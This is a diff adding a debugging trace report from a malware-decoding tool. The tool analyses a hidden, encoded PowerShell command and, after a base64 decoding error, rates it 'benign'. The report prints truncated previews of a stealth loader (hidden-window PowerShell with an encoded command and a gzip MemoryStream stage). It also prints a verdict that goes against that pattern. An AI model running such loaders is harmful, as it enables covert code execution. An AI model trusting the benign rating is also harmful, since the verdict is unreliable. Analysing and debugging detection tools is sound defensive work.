@@ -1,0 +1,100 @@
+══════════════════════════════════════════════════════════════════════════════
+  NIVXRAY · DECODE TRACE REPORT
+══════════════════════════════════════════════════════════════════════════════
+
+INPUT
+  ├── SHA-256/16      : 5016f7a7128a4fe4
+  ├── Length          : 7,625 chars
+  ├── Atomic IOC kind : (none)
+  └── Preview         : %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A…
+
+↓
+
+STAGE 1 · INPUT UNDERSTANDING (IU)
+  Classification : None
+  Confidence     : 90
+  Language       : None
+  Capabilities   : []
+
+↓
+
+STAGE 2 · COMMAND RECONSTRUCTION (CRE)
+  Effective payload : sha=2743c351c498de3a  len=7,624
+  Preview           : %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A…
+
+↓
+
+STAGE 3 · RECURSIVE TRANSFORMATION ENGINE (RTE)
+  stop_reason      : no_transformation
+  depth            : 1   layers: 2   steps: 1
+  determinism_hash : c91d59d992e86eb0
+
+  LAYERS:
+    L0  sha=2743c351c498de3a  len=  7624  kind=None
+        preview: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBl…
+    L1  sha=efde0383cac981d4  len=  2831  kind=None
+        preview: $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAK1X63OiShb/HP8KPqRKLU2Cj5g4…
+
+  STEPS:
+    step 0  ps_encoded_command                   L0→L1  conf=98  changed=True
+
+  DIAGNOSTICS:
+    [  ERROR] DX1001  INVALID_BASE64_LENGTH  (root)
+             Detected invalid Base64 length (2635 characters, length mod 4 = 3). The embedded payload appears incomplete or malformed. Gzip inflate failed: error: Error -3 w
+    [   INFO] DX2002  NO_FURTHER_DETERMINISTIC_TRANSFORMATION  caused_by=DX1001
+             The Recursive Transformation Engine could not find any deterministic transformation to apply to the current layer. This is the principled convergence state; the
+
+  → FINAL ARTEFACT : sha=efde0383cac981d4  len=2831
+
+↓
+
+STAGE 4 · SEMANTIC INTENT (Investigation Brain input)
+  Input-to-brain    : sha=efde0383cac981d4  len=2831
+  Intents fired     : 0
+  determinism_hash  : 916dcaa4ad218aa0
+
+↓
+
+STAGE 5 · BEHAVIOR GRAPH
+  schema       : None
+  nodes/edges  : 0 / 0
+
+↓
+
+STAGE 6 · VERDICT UPLIFT
+  band         : benign   confidence: 60
+  composition  : []
+  reason       : No adversarial intent was inferred from the effective payload. The artefact appears benign.
+
+↓
+
+STAGE 7 · ANALYST REPORT
+  executive summary : 134 chars
+  mitre / iocs / recs : 0 / 0 / 0
+
+══════════════════════════════════════════════════════════════════════════════
+  UI PAYLOAD MAPPING (from LIVE deployed API)
+══════════════════════════════════════════════════════════════════════════════
+  endpoint            : https://greeting-app-5782.preview.emergentagent.com/api/decode/smart
+  response keys       : 40 keys
+  ui `output` sha/len : ebf8b6c6385bd7b3  3958
+  ui `output` starts  : ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⏎▼ INVESTIGATION BRAIN · RTE DECODER TRACE⏎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⏎  stop_reason:      no_t…
+  ui has RTE header?  : True
+  ui `output_legacy`  : len=2909 · ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⏎▼ DECODED OUTPUT⏎━━━━━━━━━━━━━━━━…
+  investigation.rte   : stop=no_transformation  depth=1  artefacts=2
+  investigation.verdict.band : benign  conf: 60
+  investigation.intent count : 0
+  legacy verdict_v2 / _card  : None  /  Partial
+
+══════════════════════════════════════════════════════════════════════════════
+  FOUR DIAGNOSTIC QUESTIONS (evidence-based)
+══════════════════════════════════════════════════════════════════════════════
+  Q1  artifacts[] contains decoded PowerShell?           YES · Decoder produced ≥ 2 layers
+  Q2  API `output` field carries decoded PowerShell?      YES (len=3958)
+  Q3  UI payload contains the RTE brain-block header?     YES
+  Q4  If artifacts[] partial, last decoder / stop_reason  ps_encoded_command / no_transformation
+      root diagnostic: DX1001  INVALID_BASE64_LENGTH
+
+══════════════════════════════════════════════════════════════════════════════
+  investigation determinism_hash : 9a95fd8166557239
+══════════════════════════════════════════════════════════════════════════════
